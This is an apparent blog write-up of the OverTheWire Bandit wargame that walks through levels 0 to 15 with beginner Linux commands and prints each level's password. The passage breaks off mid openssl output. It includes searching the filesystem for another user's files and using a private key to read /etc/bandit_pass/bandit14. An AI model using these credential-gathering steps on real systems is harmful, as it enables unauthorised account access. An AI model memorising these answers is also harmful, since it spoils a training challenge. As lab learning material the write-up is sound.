
---
title: OverTheWIre - Bandit
author:
    - Naraka
tags:
    - OverTheWire
    - Bandit
    - Writeup
date: 2020-04-18
---

# Bandit

|<a name="TableOfContent"></a>Tabel Of Content|Write-Up | Bandit		  |  Level 1- 34   |
| :-------:|:-------------:| :-------------:|:-------------:|
|[Level0](#Level0)| [Level 1](#Level1) | [Level 2](#Level2) | [Level 3](#Level1) | [Level 4](#Level4)|
| [Level 5](#Level5) | [Level 6](#Level6) | [Level 7](#Level7) | [Level 8](#Level8)|
| [Level 9](#Level9) | [Level 10](#Level10) | [Level 11](#Level11) | [Level 12](#Level12)|
| [Level 13](#Level13) | [Level 14](#Level14) | [Level 15](#Level15) | [Level 16](#Level16)|
| [Level 17](#Level17) | [Level 18](#Level18) | [Level 19](#Level19) | [Level 20](#Level20)|
| [Level 21](#Level21) | [Level 22](#Level22) | [Level 23](#Level23) | [Level 24](#Level24)|
| [Level 25](#Level25) | [Level 26](#Level26) | [Level 27](#Level27) | [Level 28](#Level28)|
| [Level 29](#Level29) | [Level 30](#Level30) | [Level 31](#Level31) | [Level 32](#Level32)|
| [Level 33](#Level33) |  |  |  |

_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level0"></a>Level 0 -> 1

> ```bash
> ssh bandit0@bandit.labs.overthewire.org -p 2220
> 
> Level Goal
> 	The goal of this level is for you to log into
> 	the game using SSH. The host to which you need
> 	to connect is bandit.labs.overthewire.org,
> 	on port 2220. The 	username is bandit0 and
> 	the password is bandit0. Once 	logged in,
> 	go to the Level 1 page to find out how to
> 	beat Level 1.
> 	The password for the next level is stored in
> 	a file called readme located in the home
> 	directory. Use this password to log into
> 	bandit1 using SSH. Whenever you find a
> 	password for a level, use SSH (on port 2220)
> 	to log into that level and continue the game.
> ```

ssh is the protocol to login.
ssh usage:
```
<USRNAME>@<SERVER-CONNECTION-ADDRESS>
```
to specify a differnt port you will need to specify the ``` -p ``` FLAG

It then asks for a Passowrd which in this case is **bandit0**

once logged in we run the command `ls`. this shows us all the different files in the current directory. 

We see the file **readme** to see the content we can use the command `cat`. 
this will then display the password which we then use to login to Level1

> ## FLAG:
>```bash
>	pwd: boJ9jbbUNNfktd78OOpsqOltutMc3MY1
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level1"></a>Level 1 -> 2

> ```bash
> ssh bandit1@bandit.labs.overthewire.org -p 2220
> pwd: boJ9jbbUNNfktd78OOpsqOltutMc3MY1
> 
> Level Goal
> 	The password for the next level is stored in
> 	a file called - located in the home directory
> ```

when loggin and run the `ls` command we found a file called `-`. to be abel to **cat** this file we need to prepend it with `./`

so the final command looks like
```bash
cat ./-
```
we then recieve the pwd for the next level

> ## FLAG:
>```bash
>	pwd: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level2"></a>Level 2 -> 3

> ```bash
> ssh bandit2@bandit.labs.overthewire.org -p 2220
> pwd: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
> 
> Level Goal
> 	The password for the next level is stored in
> 	a file called spaces in this filename located
> 	in the home directory
> ```

here we were greted with a file which had **spaces** in its file name.
to be able to get the content from this fiel we utalise `\` infront of each space. Or the other option is to use the buildin autocomplete function with can be accessed via  TABing.

the command will look like this:
```bash
cat spaces\ in\ this\ filename
```
and then we get the password for the next level

> ## FLAG:
>```bash
>	pwd: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level3"></a>Level 3 -> 4

> ```bash
> ssh bandit3@bandit.labs.overthewire.org -p 2220
> pwd: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
> 
> Level Goal
> 	The password for the next level is stored in
> 	a hidden file in the inhere directory.
> ```

in this level we were given a directory called `inhere`. once we navigated into it and ran the normal `ls` command we wouldnt find any further information. but when running `ls -a` this then reveald a hidden file. these are prenoted with a dot at the front.

the command looks like this:
```bash
cat .hidden
```

and then we get the password for the next level

> ## FLAG:
>```bash
>	pwd: pIwrPrtPN36QITSp3EQaw936yaFoFgAB
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level4"></a>Level 4 -> 5

> ```bash
> ssh bandit4@bandit.labs.overthewire.org -p 2220
> pwd: pIwrPrtPN36QITSp3EQaw936yaFoFgAB
> 
> Level Goal
> 	The password for the next level is stored in
> 	the only human-readable file in the inhere
> 	directory. Tip: if your terminal is messed
> 	up, try the “reset” command.
> ```

we have been told to find the file in `inthere` folder. in here we have been told it should be human redable.
this can be done with:
```bash
file ./-*
	./-file00: data
	./-file01: data
	./-file02: data
	./-file03: data
	./-file04: data
	./-file05: data
	./-file06: data
	./-file07: ASCII text
	./-file08: data
	./-file09: data
```
the password is
when reading the content for the file `./file07` we get the password for the next level.

> ## FLAG:
>```bash
>	pwd: koReBOKuIDDepwhWk7jZC0RTdopnAYKh
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level5"></a>Level 5 -> 6

> ```bash
> ssh bandit5@bandit.labs.overthewire.org -p 2220
> pwd: koReBOKuIDDepwhWk7jZC0RTdopnAYKh
> 
> Level Goal
> 	The password for the next level is stored in
> 	a file somewhere under the inhere directory
> 	and has all of the following properties:
> 
> 	human-readable
> 	1033 bytes in size
> 	not executable
> ```

we have been told to find the file in `inthere` folder. in here we have been told it should be human redable with a certain file size.
this can be done with:
```bash
 find ./ -size 1033c
	./maybehere07/.file2
```
when reading the files sontent we get this output
```bash
cat ./maybehere07/.file2
	DXjZPULLxYr17uwoI01bNLQbtFemEgo7
```

> ## FLAG:
>```bash
>	pwd: DXjZPULLxYr17uwoI01bNLQbtFemEgo7
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level6"></a>Level 6 -> 7

> ```bash
> ssh bandit6@bandit.labs.overthewire.org -p 2220
> pwd: DXjZPULLxYr17uwoI01bNLQbtFemEgo7
> 
> Level Goal
> 	The password for the next level is stored
> 	somewhere on the server and has all of the
> 	following properties:
> 
> 	owned by user bandit7
> 	owned by group bandit6
> 	33 bytes in size
> ```

when we first run `ls` we dont seem to find any files.

we have been given the infomation
```text
	owned by user bandit7
	owned by group bandit6
	33 bytes in size
```
we then use the same command as before but this time we add some more parametersas seen below
```bash
find / -size 33c -user bandit7 -group bandit6
	find: ‘/run/lvm’: Permission denied
	find: ‘/run/screen/S-bandit33’: Permission denied
	find: ‘/run/screen/S-bandit0’: Permission denied
	find: ‘/run/screen/S-bandit15’: Permission denied
	find: ‘/run/screen/S-bandit12’: Permission denied
	find: ‘/run/screen/S-bandit5’: Permission denied
	find: ‘/run/screen/S-bandit17’: Permission denied
	find: ‘/run/screen/S-bandit7’: Permission denied
	find: ‘/run/screen/S-bandit13’: Permission denied
	find: ‘/run/screen/S-bandit11’: Permission denied
	find: ‘/run/screen/S-bandit9’: Permission denied
	find: ‘/run/screen/S-bandit27’: Permission denied
	find: ‘/run/screen/S-bandit25’: Permission denied
	find: ‘/run/screen/S-bandit2’: Permission denied
	find: ‘/run/screen/S-bandit16’: Permission denied
	find: ‘/run/screen/S-bandit20’: Permission denied
	find: ‘/run/screen/S-bandit30’: Permission denied
	find: ‘/run/screen/S-bandit14’: Permission denied
	find: ‘/run/screen/S-bandit31’: Permission denied
	find: ‘/run/screen/S-bandit8’: Permission denied
	find: ‘/run/screen/S-bandit4’: Permission denied
	find: ‘/run/screen/S-bandit29’: Permission denied
	find: ‘/run/screen/S-bandit28’: Permission denied
	find: ‘/run/screen/S-bandit21’: Permission denied
	find: ‘/run/screen/S-bandit26’: Permission denied
	find: ‘/run/screen/S-bandit24’: Permission denied
	find: ‘/run/screen/S-bandit22’: Permission denied
	find: ‘/run/screen/S-bandit1’: Permission denied
	find: ‘/run/screen/S-bandit19’: Permission denied
	find: ‘/run/screen/S-bandit23’: Permission denied
	find: ‘/run/shm’: Permission denied
	find: ‘/run/lock/lvm’: Permission denied
	find: ‘/var/spool/bandit24’: Permission denied
	find: ‘/var/spool/rsyslog’: Permission denied
	find: ‘/var/spool/cron/crontabs’: Permission denied
	find: ‘/var/log’: Permission denied
	find: ‘/var/tmp’: Permission denied
	find: ‘/var/cache/ldconfig’: Permission denied
	find: ‘/var/cache/apt/archives/partial’: Permission denied
->  /var/lib/dpkg/info/bandit7.password
	find: ‘/var/lib/apt/lists/partial’: Permission denied
	find: ‘/var/lib/polkit-1’: Permission denied
	find: ‘/cgroup2/csessions’: Permission denied
	find: ‘/home/bandit28-git’: Permission denied
	find: ‘/home/bandit30-git’: Permission denied
	find: ‘/home/bandit31-git’: Permission denied
	find: ‘/home/bandit5/inhere’: Permission denied
	find: ‘/home/bandit27-git’: Permission denied
	find: ‘/home/bandit29-git’: Permission denied
	find: ‘/tmp’: Permission denied
	find: ‘/lost+found’: Permission denied
	find: ‘/root’: Permission denied
	find: ‘/etc/ssl/private’: Permission denied
	find: ‘/etc/lvm/backup’: Permission denied
	find: ‘/etc/lvm/archive’: Permission denied
	find: ‘/etc/polkit-1/localauthority’: Permission denied
	find: ‘/sys/fs/pstore’: Permission denied
	find: ‘/proc/tty/driver’: Permission denied
	find: ‘/proc/26748/task/26748/fd/6’: No such file or directory
	find: ‘/proc/26748/task/26748/fdinfo/6’: No such file or directory
	find: ‘/proc/26748/fd/5’: No such file or directory
	find: ‘/proc/26748/fdinfo/5’: No such file or directory
	find: ‘/boot/lost+found’: Permission denied
```
lets see what that file contains.
```bash
cat /var/lib/dpkg/info/bandit7.password
	pwd: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
```

> ## FLAG:
>```bash
>	pwd: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level7"></a>Level 7 -> 8

> ```bash
> ssh bandit7@bandit.labs.overthewire.org -p 2220
> pwd: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
> 
> Level Goal
> 	The password for the next level is stored in
> 	the file data.txt next to the word millionth
> ```

we have been given a text file called `data.txt`. in there next to the word `millionth` we will find the password.
the method used is grep.

```bash
cat data.txt | grep millionth
	millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV
```

> ## FLAG:
>```bash
>	pwd: cvX2JJa4CFALtqS87jk27qwqGhBM9plV
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level8"></a>Level 8 -> 9

> ```bash
> ssh bandit8@bandit.labs.overthewire.org -p 2220
> pwd: cvX2JJa4CFALtqS87jk27qwqGhBM9plV
> 
> Level Goal
> 	The password for the next level is stored in
> 	the file data.txt and is the only line of
> 	text that occurs only once
> ```

For this level we had to read the content from the file and `sort` it. this can be done by piping the content to another command. from there we use `uniq -u` to show us the only uniq string in the file

```bash
cat data.txt | sort | uniq -u
	UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
```

> ## FLAG:
>```bash
>	pwd: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level9"></a>Level 9 -> 10

> ```bash
> ssh bandit9@bandit.labs.overthewire.org -p 2220
> pwd: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
> 
> Level Goal
> 	The password for the next level is stored in
> 	the file data.txt in one of the few
> 	human-readable strings, beginning with
> 	several ‘=’ characters.
> ```

here we had to `read` the data and `sort` it again. afterwards we then got all the `strings` outputted from there we got the password.

```bash
cat data.txt | sort | strings
	RcJ h
	*JI;
	mzy8s#
	8("Ym
	q7 u@
	J@&C
	JI9J
	+TuBy
	^ek$
	K8P77f+
	"1oq
	Nd^*<
	!|#D
	8kk#A
	H.yKk
	g%tq_
	\+pW
	n_'h
	f^<-KJ
	J;m=
	W	3C
	c0@L<.
	yP1g
	?9Xc6
	VkcO
	ZI	-^ip
	*t[z
	{d2~
	n1p	A
	TE[S
	3EQi
	)'0U
	a;0\
	az|Y+
	w]Ov
	`4F<N
	t8lHX u
	W.uO7
	i$2w
	epg~
	i^eE
	========== password
	wU5	
	iv8!=
	fBBB
	^$a?
	,FAl
	5M_8
	Z:rU
	m$jJ
	oM\U
	DgdJ
	c	_<9>D
	Igzz
	//Jr
	:DLq
	qEk9s
	ci`2
	c([t
	y>?+
	jgF5X
	T}~_Z]
	========== isa
	P-+i
	$OGu
	Ez&.
	3 5w
	M0d>uG
	G@?>
	"a`*
	38zT
	`mNg H
	:U[,
	c?Vh
	CEhL5d
	2========== the
	r,!l
	FMQ]2
	Sf2 
	5iu^B
	#e1[u
	NHGu
	5xhH
	#&Op
	\u~#
	nd19
	o?Mwf
	m\uG
	tw3y
	[[N#
	xo?C
	h\h<M
	&B&l
	47M<}
	&~Zd
	Sh+b
	8a?E
	)/<PO
	rV~dHm=
	];,I
	"{q<
	=	F[
	2YkI!
	wt2N
	>t=	yP
	`'8u
	!"Di
	I#8B
	+"aH
	?L'[i!#S
	!H>k0J
		0l`c
	kH )
	=)$=
	}mOU
	[_g25
	72\P
	xQf]
	6G5L
	F2wrB
	m14g
	{82AX
	7k6	
	~$0bDWT
	@Mgk
		:uy
	Q"7d
	`THN
	GI5M
	!(Yl
	G\@P
	h2aO
	XvMTP
	Hm["V
	|,ZO
	e#s.	
	!:/%p
	*'dZ
	bgM>H
	Ju:5s-~
	{vbT
	1mBO
	^VS'
	oFP/;l
	*m&-
	<E:C{{
	\3;W
	oZ_N
	U4@v
		IOG+
	"k"}
	9Mz;
	|NJP
	pb=x
	AAbd<
	((97
	-q}u
	5eQP
	snn`*
	"T?X^
	D2HM
	|f;P]!
	~5&:
	cT>ZHE
	7li&
	$O@]
	qbvT
	vXib
	]Knt
	:m;r
	w:	vC
	>{Tz
	pT{%5
	tYrQT(
	dsTaFp
	lI_z
	UoUf
	5{0+
	Xj/^
	oc8,`:
	k+0dbun
	h.TF
	>V	I
	Zaf3
	OWj6
	GY	E
	,ebr
	i$Vh
	CL}0Vx<M6
	mB#L
	S%T{`G
	LUu]\
	`r	$C
	xL4%
	!AwV
	@T.a-
	6NJ~
	H0&t.
	$Y)&wA	Y
	D%t`
	\<Nj
	\Zo\h]
	'NL}B
	*	+ta
	Fj~%E
	lj/f
	d3hM
	5m*rU?w[
	BE3K
	]o#s
	i_9r
	0L&,
	HfA0
	<h%7
	ox:z
	X9H]*x]
	S2Fx
	5Vmgn
	hP}"
	e&/R
	czdy
	h;W	
	g[W%
	=FQ?P\U
	#u&	ZQ~f
	.r@v
	"dPy~
	+vex1]
	Y(Zs
	Cl/(;
	{4x	
	.MBB
	`B6ha
	nK)U2u
	&y@@2
	5Lo%
	ru@n
	D}U'
	yA1H]W
	Z7 IS|
	FN+r
	4FS;
	========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
		@m>[
	fhul
	&%I{
	g0?W;
	SXEO
	Q,9_
	$!T1
	ypi*
	lTq;
	UqUY`
	d&lk
```

> ## FLAG:
>```bash
>	pwd: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level10"></a>Level 10 -> 11

> ```bash
> ssh bandit10@bandit.labs.overthewire.org -p 2220
> pwd: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
> 
> Level Goal
> 	The password for the next level is stored in
> 	the file data.txt, which contains base64
> 	encoded data
> ```

We gotten a file and when first looking at it it doesnt look like much. When we send the data into a base64 decoder which is done with `base64 -d` we get the password.
```bash
cat data.txt | base64 -d
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
```

> ## FLAG:
>```bash
>	pwd: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level11"></a>Level 11 -> 12

> ```bash
> ssh bandit11@bandit.labs.overthewire.org -p 2220
> pwd: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
> 
> Level Goal
> 	The password for the next level is stored in
> 	the file data.txt, where all lowercase (a-z)
> 	and uppercase (A-Z) letters have been rotated
> 	by 13 positions
> ```

We gotten a file and when first looking at it it doesnt look like much. When we send the data into a ROT13 decoder which is done with transposing the letters from one to a different letter `tr '[A-Za-z]' '[N-ZA-Mn-za-m]'` we get the password.

```bash
cat data.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
	The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
```

> ## FLAG:
>```bash
>	pwd: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level12"></a>Level 12 -> 13

> ```bash
> ssh bandit12@bandit.labs.overthewire.org -p 2220
> pwd: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
> 
> Level Goal
> 	The password for the next level is stored in 
> 	the file data.txt, which is a hexdump of a 
> 	file that has been repeatedly compressed. 
> 	For this level it may be useful to create 
> 	a directory under /tmp in which you can 
> 	work using mkdir. For example: mkdir
> 	/tmp/myname123. Then copy the datafile using 
> 	cp, and rename it using mv (read the manpages!)
> ```

first step is to move the file into a temporanry directory.
this is done by 
```bash
mkdir /tmp/<DIRECTORY-NAME> && cd /tmp/<DIRECTORY-NAME>
cp ~/<FILE-NAME> .
```
once we have the file there we canstart looking at what the file contains.
```bash
file data.txt 
	data.txt: ASCII text
```
when we cat the content we get this as a result:

```hexdump
	cat data.txt 
00000000: 1f8b 0808 d7d2 c55b 0203 6461 7461 322e  .......[..data2.
00000010: 6269 6e00 013c 02c3 fd42 5a68 3931 4159  bin..<...BZh91AY
00000020: 2653 591d aae5 9800 001b ffff de7f 7fff  &SY.............
00000030: bfb7 dfcf 9fff febf f5ad efbf bbdf 7fdb  ................
00000040: f2fd ffdf effa 7fff fbd7 bdff b001 398c  ..............9.
00000050: 1006 8000 0000 0d06 9900 0000 6834 000d  ............h4..
00000060: 01a1 a000 007a 8000 0d00 0006 9a00 d034  .....z.........4
00000070: 0d1a 3234 68d1 e536 a6d4 4000 341a 6200  ..24h..6..@.4.b.
00000080: 0069 a000 0000 0000 d003 d200 681a 0d00  .i..........h...
00000090: 0001 b51a 1a0c 201e a000 6d46 8068 069a  ...... ...mF.h..
000000a0: 6834 340c a7a8 3406 4000 0680 0001 ea06  h44...4.@.......
000000b0: 8190 03f5 4032 1a00 0343 4068 0000 0686  ....@2...C@h....
000000c0: 8000 0320 00d0 0d00 0610 0014 1844 0308  ... .........D..
000000d0: 04e1 c542 9ab8 2c30 f1be 0b93 763b fb13  ...B..,0....v;..
000000e0: 50c4 c101 e008 3b7a 92a7 9eba 8a73 8d21  P.....;z.....s.!
000000f0: 9219 9c17 052b fb66 a2c2 fccc 9719 b330  .....+.f.......0
00000100: 6068 8c65 e504 5ec0 ae02 fa6d 16bc 904b  `h.e..^....m...K
00000110: ba6c f692 356e c02b 0374 c394 6859 f5bb  .l..5n.+.t..hY..
00000120: 0f9f 528e 4272 22bb 103c 2848 d8aa 2409  ..R.Br"..<(H..$.
00000130: 24d0 d4c8 4b42 7388 ce25 6c1a 7ec1 5f17  $...KBs..%l.~._.
00000140: cc18 ddbf edc1 e3a4 67f1 7a4d 8277 c823  ........g.zM.w.#
00000150: 0450 2232 40e0 07f1 ca16 c6d6 ef0d ecc9  .P"2@...........
00000160: 8bc0 5e2d 4b12 8586 088e 8ca0 e67d a55c  ..^-K........}.\
00000170: 2ca0 18c7 bfb7 7d45 9346 ea5f 2172 01e4  ,.....}E.F._!r..
00000180: 5598 673f 45af 69b7 a739 7814 8706 04ed  U.g?E.i..9x.....
00000190: 5442 1240 0796 6cc8 b2f6 1ef9 8d13 421d  TB.@..l.......B.
000001a0: 461f 2e68 4d91 5343 34b5 56e7 46d0 0a0a  F..hM.SC4.V.F...
000001b0: 72b7 d873 71d9 6f09 c326 402d dbc0 7cef  r..sq.o..&@-..|.
000001c0: 53b1 df60 9ec7 f318 00df 3907 2e85 d85b  S..`......9....[
000001d0: 6a1a e105 0207 c580 e31d 82d5 8646 183c  j............F.<
000001e0: 6a04 4911 101a 5427 087c 1f94 47a2 270d  j.I...T'.|..G.'.
000001f0: ad12 fc5c 9ad2 5714 514f 34ba 701d fb69  ...\..W.QO4.p..i
00000200: 8eed 0183 e2a1 53ea 2300 26bb bd2f 13df  ......S.#.&../..
00000210: b703 08a3 2309 e43c 44bf 75d4 905e 5f96  ....#..<D.u..^_.
00000220: 481b 362e e82d 9093 7741 740c e65b c7f1  H.6..-..wAt..[..
00000230: 5550 f247 9043 5097 d626 3a16 da32 c213  UP.G.CP..&:..2..
00000240: 2acd 298a 5c8a f0c1 b99f e2ee 48a7 0a12  *.).\.......H...
00000250: 03b5 5cb3 0037 cece 773c 0200 00         ..\..7..w<...

```

The next Step is to then reconstruct the Hexdump. to do this we use the `xxd` programm and create a new file while extracting the data. 

```bash
	xxd -r data.txt data1
```

the next step is to inspect what file type it is and if we can already view the content.

```bash
file data1
	data1: gzip compressed data, was "data2.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
```

this shows us that the file is a gzip compressed file. this means that we still have some more work to do. lets continue.

A gzip file should have the ending of `.gz` this means we have to rename/move the just created file to have this.

```bash
	mv data1 data1.gz
```

We then run `gzip` against this file to extract the content.

```bash
	gzip -d data1.gz
```

once this is completed we will be given a file called `data1`.

we then inspect it again.

```bash
file data1
	data1: bzip2 compressed data, block size = 900k
```

this now shows us that it is a `bzip2` file, these have the `.bz2` ending on the files. we now need to change that again as before..

```bash
	mv data1 data2.bz2
```

once we have done that we can then run `bzip2` against it to see what it contains.

```bash
	bzip2 -d data2.bz2
```

we have now been given another file. lets check this content.

```bash
file data2
	data2: gzip compressed data, was "data4.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
```

it is another `gzip` so we do the same thing as befor.

```bash
	mv data2 data3.gz
```

now we can run `gzip against it again.

```bash
	gzip -d data3.gz
```

this then gives us a file called `gzip3`. 

lets check this file out.

```bash
file data3
	data3: POSIX tar archive (GNU)
```

[how to use Tar](https://www.computerhope.com/unix/utar.htm)

we then have to use tar to extract the file content.

```bash
tar -xvf data3
	data5.bin
```
x is for extract
f is for file
v is for verbose

when inspecting the `data5.bin` file we get the following response.

```bash
file data5.bin
	data5.bin: POSIX tar archive (GNU)
```

this means we have to do the same again as befor.

```bash
tar -xvf data5.bin
	data6.bin
```

this gives us another file. lets check it out.

```bash
file data6.bin
	data6.bin: bzip2 compressed data, block size = 900k
```

this time we have been given a `bzip2` file again.
lets move it to a new file and have the correct ending. and then also run the right command against it also as commands can be concatinated with `&&`

```bash
mv data6.bin data7.bz2 && bzip2 -d data7.bz2 && file data7
	data7: POSIX tar archive (GNU)
```

we can see that now we have been given another `tar` file. lets extract it again

```bash
 tar -xvf data7 && file data8.bin
	data8.bin
	data8.bin: gzip compressed data, was "data9.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
```

lets unzip this newly won file.

```bash
mv data8.bin data9.gz && gzip -d data9.gz
```

this then gives us `data9` as a file.

when we check the type of the new file we should get this result.

```bash
file data9
	data9: ASCII text
```

we then retrieve the data from this file

```bash
cat data9
	The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```

> ## FLAG:
>```bash
>	pwd: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level13"></a>Level 13 -> 14

> ```bash
> ssh bandit13@bandit.labs.overthewire.org -p 2220
> pwd: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
> 
> Level Goal
> 	The password for the next level is stored in 
> 	/etc/bandit_pass/bandit14 and can only be read
> 	by user bandit14. For this level, you don’t
> 	get the next password, but you get a private
> 	SSH key that can be used to log into the next
> 	level. Note: localhost is a hostname that 
> 	refers to the machine you are working on
> ```

for this level e have to login via ssh to the other server with the private key.
this can be done with the `-i` flag. 

```bash
ssh bandit14@localhost -i sshkey.private
```

we then read the content from the file and retrieve the password
```bash
cat /etc/bandit_pass/bandit14 
	4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
```

> ## FLAG:
>```bash
>	pwd: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level14"></a>Level 14 -> 15

> ```bash
> ssh bandit14@bandit.labs.overthewire.org -p 2220
> pwd: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
> 
> Level Goal
> 	The password for the next level can be 
> 	retrieved by submitting the password of 
> 	the current level to port 30000 on localhost.
> ```

As we have been told that we have to connect to port `30000 on localhost`. this can be done with telnet.
we give it the password from the current user and get the pwd for the next level.

```bash
telnet localhost 30000
	Trying 127.0.0.1...
	Connected to localhost.
	Escape character is '^]'.
	4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
	Correct!
	BfMYroe26WYalil77FoDi9qh59eK5xNr
	
	Connection closed by foreign host.
```

> ## FLAG:
>```bash
>	pwd: BfMYroe26WYalil77FoDi9qh59eK5xNr
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level15"></a>Level 15 -> 16

> ```bash
> ssh bandit15@bandit.labs.overthewire.org -p 2220
> pwd: BfMYroe26WYalil77FoDi9qh59eK5xNr
> 
> Level Goal
> 	The password for the next level can be 
> 	retrieved by submitting the password of 
> 	the current level to port 30001 on 
> 	localhost using SSL encryption.
> 
> 	Helpful note: Getting “HEARTBEATING” and “Read 
> 	R BLOCK”? Use -ign_eof and read the
> 	“CONNECTED COMMANDS” section in the manpage. 
> 	Next to ‘R’ and ‘Q’, the ‘B’ command also 
> 	works in this version of that command…
> ```

for this level we have to connect to a server running on local host with an openport of 30001.

this can be done with openssl.
it then asks us for the password which we provide it with and then it gives us back the pwd for the next level.
```bash
openssl s_client -connect localhost:30001
	CONNECTED(00000003)
	depth=0 CN = localhost
	verify error:num=18:self signed certificate
	verify return:1
	depth=0 CN = localhost
	verify return:1
	---
	Certificate chain
	 0 s:/CN=localhost
	   i:/CN=localhost
	---
	Server certificate
	-----BEGIN CERTIFICATE-----
	MIICBjCCAW+gAwIBAgIEYo1NxTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls
	b2NhbGhvc3QwHhcNMjAwMTA1MTQzNTU4WhcNMjEwMTA0MTQzNTU4WjAUMRIwEAYD
	VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAKF4u2eu
	a8VipZPviX0hfNiCnaD2ojAffdBhKTy1bmZSNRuHPBDnU7z8rblNSknSjCITda1C
	GEAI8ZktRbtLpBTbYeTgqPN/EiN5UIRMKbU6P2O93zNFPBsmyfQLrgt+DSLnsxlB
	i/yYyT7WLdtNVBpgwRwkqi9K7dk9vf9waswLAgMBAAGjZTBjMBQGA1UdEQQNMAuC
	CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0
	ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3
	DQEBBQUAA4GBAJECW6IB3Ria4xG002BqD3zEbtmrDlK6nmJq+uQ4eJ6cT18o9REb
	npy/lFzlv2LfcrYAnuAp6Fh89MKaYjNzJURjRQ9RkmcYgQJa1n+OBkATb7V+84/a
	k9PDRkscxdNFMGBSvzFD33XZ5lbaGdrwCPyoxenoYghV/753wffN7J6H
	-----END CERTIFICATE-----
	subject=/CN=localhost
	issuer=/CN=localhost
	---
	No client certificate CA names sent
	Peer signing digest: SHA512
	Server Temp Key: X25519, 253 bits
	---
	SSL handshake has read 1019 bytes and written 269 bytes
	Verification error: self signed certificate
	---
	New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
	Server public key is 1024 bit
	Secure Renegotiation IS supported
	Compression: NONE
	Expansion: NONE
	No ALPN negotiated
	SSL-Session:
	    Protocol  : TLSv1.2
	    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
	    Session-ID: AF5DC51A3E30FB016A25EEDDBF42DC264713BE531AFD184A3C5C037CD4042C25
	    Session-ID-ctx: 
	    Master-Key: 4E2ACB1E30CCE16DB66EB7B22485BC72842DA9865D5D56423EC18FC64577360CB39D66902F28E94ACC650244213E49D9
	    PSK identity: None
	    PSK identity hint: None
